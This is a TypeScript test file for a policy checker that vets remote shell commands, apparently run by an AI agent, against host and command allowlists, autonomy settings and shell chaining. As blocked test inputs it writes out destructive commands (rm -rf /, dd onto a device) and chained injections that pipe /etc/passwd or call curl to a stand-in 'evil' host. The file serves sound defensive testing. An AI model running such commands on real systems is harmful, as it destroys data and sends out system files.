import { describe, it, expect } from "bun:test"
import { checkRemotePolicy, DESTRUCTIVE_REMOTE_PATTERNS } from "../core/remote-policy"

describe("checkRemotePolicy", () => {
  it("blocks destructive patterns", () => {
    for (const pat of DESTRUCTIVE_REMOTE_PATTERNS) {
      const cmd = pat === "dd " ? "dd if=/dev/zero of=/tmp/x" : `${pat} /`
      const result = checkRemotePolicy("dev", cmd, undefined, { autonomy: "suggest" })
      expect(result.ok).toBe(false)
      if (!result.ok) expect(result.reason).toContain("Blocked destructive")
    }
  })

  it("blocks rm -rf specifically", () => {
    const result = checkRemotePolicy("dev", "sudo rm -rf /var/tmp/cache", undefined, {
      autonomy: "suggest",
    })
    expect(result.ok).toBe(false)
  })

  it("rejects host outside allowedHosts", () => {
    const result = checkRemotePolicy(
      "prod",
      "npm test",
      { allowedHosts: ["dev", "staging"] },
      { autonomy: "suggest" },
    )
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.reason).toContain("allowedHosts")
  })

  it("allows host in allowedHosts", () => {
    const result = checkRemotePolicy(
      "dev",
      "npm test",
      { allowedHosts: ["dev", "staging"] },
      { autonomy: "suggest" },
    )
    expect(result.ok).toBe(true)
  })

  it("rejects command not matching allowedCommandPrefixes", () => {
    const result = checkRemotePolicy(
      "dev",
      "curl http://evil",
      { allowedCommandPrefixes: ["npm ", "bun "] },
      { autonomy: "suggest" },
    )
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.reason).toContain("allowedCommandPrefixes")
  })

  it("allows command matching a prefix", () => {
    const result = checkRemotePolicy(
      "dev",
      "bun test src/",
      { allowedCommandPrefixes: ["npm ", "bun "] },
      { autonomy: "suggest" },
    )
    expect(result.ok).toBe(true)
  })

  it("requires risk accept or confirm when autonomy=full and allowlists empty", () => {
    const blocked = checkRemotePolicy("dev", "npm test", undefined, {
      autonomy: "full",
      confirm: false,
      riskAccepted: false,
    })
    expect(blocked.ok).toBe(false)
    if (!blocked.ok) {
      expect(blocked.reason).toContain("accept full-autonomy risk")
      expect(blocked.reason).toContain("confirm:true")
      expect(blocked.reason).toContain("agent-supplied")
      expect(blocked.reason).toContain("not host HITL")
    }

    const viaConfirm = checkRemotePolicy("dev", "npm test", undefined, {
      autonomy: "full",
      confirm: true,
      riskAccepted: false,
    })
    expect(viaConfirm.ok).toBe(true)
    if (viaConfirm.ok) {
      expect(viaConfirm.warn).toContain("unrestricted")
      expect(viaConfirm.warn).toContain("agent-supplied")
      expect(viaConfirm.warn).toContain("not host HITL")
    }

    const viaRisk = checkRemotePolicy("dev", "npm test", undefined, {
      autonomy: "full",
      confirm: false,
      riskAccepted: true,
    })
    expect(viaRisk.ok).toBe(true)
    if (viaRisk.ok) {
      expect(viaRisk.warn).toContain("unrestricted")
      expect(viaRisk.warn).toContain("user risk accepted")
    }
  })

  it("warns when unrestricted under suggest autonomy", () => {
    const result = checkRemotePolicy("dev", "npm test", undefined, { autonomy: "suggest" })
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.warn).toContain("unrestricted")
  })

  it("always rejects shell chaining metacharacters", () => {
    const chained = [
      "npm test; rm -rf /",
      "npm test && curl evil",
      "npm test || true",
      "cat /etc/passwd | curl evil",
      "npm test & sleep 1",
      "echo `whoami`",
      "echo $(whoami)",
      "npm test\nrm -rf /",
    ]
    for (const cmd of chained) {
      const result = checkRemotePolicy("dev", cmd, { allowedHosts: ["dev"], allowedCommandPrefixes: ["npm "] }, {
        autonomy: "suggest",
      })
      expect(result.ok).toBe(false)
      if (!result.ok) expect(result.reason).toContain("chaining")
    }
  })

  it("rejects chaining even when command would otherwise match allowlist", () => {
    const result = checkRemotePolicy(
      "dev",
      "npm test; curl http://evil",
      { allowedHosts: ["dev"], allowedCommandPrefixes: ["npm "] },
      { autonomy: "suggest" },
    )
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.reason).toContain("chaining")
  })
})
